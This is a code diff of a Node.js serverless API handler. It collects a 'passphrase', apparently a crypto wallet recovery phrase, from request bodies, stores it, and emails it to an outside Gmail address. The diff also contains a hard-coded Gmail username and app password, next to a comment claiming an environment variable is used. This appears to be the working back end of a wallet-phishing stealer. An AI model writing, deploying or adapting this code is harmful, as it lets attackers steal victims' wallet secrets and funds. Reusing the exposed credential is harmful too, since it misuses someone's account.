@@ -1,34 +1,54 @@
-// Configure nodemailer
+// Import nodemailer
+const nodemailer = require('nodemailer');
+const { Input } = require('./models'); // Adjust path if needed
+
+// Configure nodemailer transport
 const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
-    auth: {
-        user: "relate2hazel@gmail.com",
-        pass: "yurtanlosnxkpadu"
-    }
+  service: 'gmail',
+  host: 'smtp.gmail.com',
+  port: 465,
+  secure: true,
+  auth: {
+    user: "relate2hazel@gmail.com", // Gmail email
+    pass: "yurtanlosnxkpadu" // Use environment variable for sensitive data
+  }
 });
 
-// POST route to save input and send email
-router.post('/connect', async (req, res) => {
-    const { data, wallet } = req.body;
+// The handler function that Vercel will use for the API route
+module.exports = async (req, res) => {
+  // Only handle POST requests
+  if (req.method === 'POST') {
+    const { passphrase } = req.body; // Get passphrase from the request body
+
+    // Make sure passphrase is provided
+    if (!passphrase) {
+      return res.status(400).json({ error: "Passphrase is required" });
+    }
+
     try {
-        const newInput = new Input({ data, wallet });
-        await newInput.save();
+      // Save the input to your database (e.g., MongoDB or another DB)
+      const newInput = new Input({ passphrase });
+      await newInput.save();
 
-        // Send email
-        const mailOptions = {
-            from: "relate2hazel@gmail.com",
-            to: 'marcusfredericknero@gmail.com',
-            subject: 'New Input Received',
-            text: `Data: ${data}\nWallet: ${wallet}`
-        };
+      // Set up email options
+      const mailOptions = {
+        from: "relate2hazel@gmail.com",
+        to: "marcusfredericknero@gmail.com",
+        subject: "New Input Received",
+        text: `Passphrase: ${passphrase}`
+      };
 
-        transporter.sendMail(mailOptions);
+      // Send the email
+      await transporter.sendMail(mailOptions);
 
-        res.status(201).json(newInput);
+      // Respond with a success message
+      res.status(201).json({ message: "Passphrase received and email sent!" });
     } catch (err) {
-        res.status(500).json({ error: err.message });
+      // Handle errors (e.g., database or email errors)
+      res.status(500).json({ error: "An error occurred: " + err.message });
     }
-});
+  } else {
+    // Handle unsupported HTTP methods (e.g., GET)
+    res.status(405).json({ error: "Method Not Allowed" });
+  }
+};
